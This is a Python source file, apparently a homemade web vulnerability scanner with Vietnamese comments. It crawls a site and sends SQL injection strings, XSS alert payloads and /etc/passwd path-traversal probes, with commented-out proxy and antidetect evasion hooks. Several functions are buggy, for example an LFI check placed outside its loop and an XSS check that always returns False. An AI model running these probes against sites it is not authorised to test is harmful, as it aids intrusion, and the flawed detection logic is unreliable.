import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import re
import sys

# from Antidetect import *



def scan_website(url):
    # user_agent = get_random_user_agent()
    # proxy = get_random_proxy()
    results = []
    
    # Crawl website 
    urls = crawl(url)
    
    # Scan URLs
    for u in urls:
        # response = requests.get(url, headers={'User-Agent': user_agent}, proxies={'http': proxy, 'https': proxy})

        response = requests.get(u)
        
        if check_sqli(u, response):
            results.append({'url': u, 'vuln': 'SQL Injection'})
            
        if check_xss(u, response):
            results.append({'url': u, 'vuln': 'Cross Site Scripting'})
            
        if check_lfi(u):
            results.append({'url': u, 'vuln': 'Local File Inclusion'})
            
    return results
        
def crawl(url):
    urls = []
    response = requests.get(url.replace('https://', 'http://'), verify=False)
    parsed = BeautifulSoup(response.text, 'html.parser')
    
    for link in parsed.find_all('a'):
        path = link.get('href')
        if path and path.startswith('/'):
            path = urljoin(url, path)
            urls.append(path)
    return urls

# Hàm kiểm tra SQL injection
def check_sqli(url, resp1):
  test_urls = [f"{url}' OR '1'='1", f"{url}' AND '1'='2"]
  
  for test_url in test_urls:
    resp1 = requests.get(test_url)  
    if check_error(resp1):
      print("Error based SQLi detected")
      return True

  return False

def check_error(response):
  # Kiểm tra nội dung lỗi 
  if "SQL syntax" in response.text:
    return True
  # Kiểm tra time delay
  if response.elapsed.total_seconds() > 1:  
    return True
    
  return False

# -----------------------------------------------------------------------
# Hàm kiểm tra XSS
session = requests.Session()
encoded_payloads = ["%3Cscript%3Ealert(1)%3C/script%3E", "%27%3Balert(1)//", "%3Cimg+src%3D1+onerror%3Dalert(1)%3E"]
attr_payloads = ['" onclick="alert(1)', '" style="xss:expression(alert(1))'] 
tag_payloads = ['<script>alert(1)</script>', '<img src=1 onerror=alert(1)>']
url_payloads = ['javascript:alert(1)', 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
                "?param=<script>alert(1)</script>",
                "?param=javascript:alert(1)"]

html_payloads = [
  "<img src=x onerror=alert(1)>",  
  "<div id='<' onclick='alert(1)'>" 
]


def check_xss(url, response):

  context = detect_context(url, response)
  
  if context == "url_param":
    payloads = url_payloads
  elif context == "html_tag":
    payloads = html_payloads
  elif context == "attribute":
    payloads = attr_payloads

  soup = BeautifulSoup(response.content, 'html.parser')

  # Check forms
  forms = soup.findAll('form')
  for form in forms:
    data = {} 
    for input in form.findAll('input'):
      for payload in payloads:
        data[input.get('name')] = payload
        response = session.post(url + form['action'], data=data)
        if payload in response.text:
          print('\nXSS in', url + form['action'])

  # Check URL parameters
  params = re.findall(r'([^?=&]+)=([^&]*)', url)
  for name, value in params:
    for payload in payloads:
      url = url.replace(f'{name}={value}', f'{name}={payload}')
      response = session.get(url)
      if payload in response.text:
        print('\nXSS in', url)

  for encoded_payload in encoded_payloads:
    url = f"{url}?q={encoded_payload}"
    response = requests.get(url)
    
    if encoded_payload in response.text:
      print("\nBypass filter with encoded payload: ", url)

    normal_payload = "<script>alert(1)</script>"
    url = f"{url}?q={normal_payload}"
    response = requests.get(url)

    if normal_payload not in response.text:
      print("\nSite filters special characters from URL: ", url)


  return False

def detect_context(url, response):
  # Phân tích URL và response để xác định context
  response = requests.get(url)

  # context = detect_context(url, response.text) 
  
  if url.find("?") > 0:
    return "url_param" 
  elif response.text.find("<script>") > 0:
    return "html_tag"
  elif response.text.find("onclick=") > 0:
    return "attribute"

  return None

# -------------------------------------------------
# Hàm kiểm tra LFI  
def check_lfi(url):
  pwd_paths = []
  
  with open('pwd.txt') as f:
    pwd_paths = f.read().splitlines()

  for path in pwd_paths:
 # Thử truy cập đến file /etc/passwd với các giá trị dẫn đến file/etc/pwd trong file pwd.txt
    lfi_url = url + path
    lfi_response = requests.get(lfi_url)
  
  # Nếu trả về nội dung file passwd là có LFI
  if "root:" in lfi_response.text and "nobody:" in lfi_response.text:
    print("Detected LFI")
    return True
  
  return False
  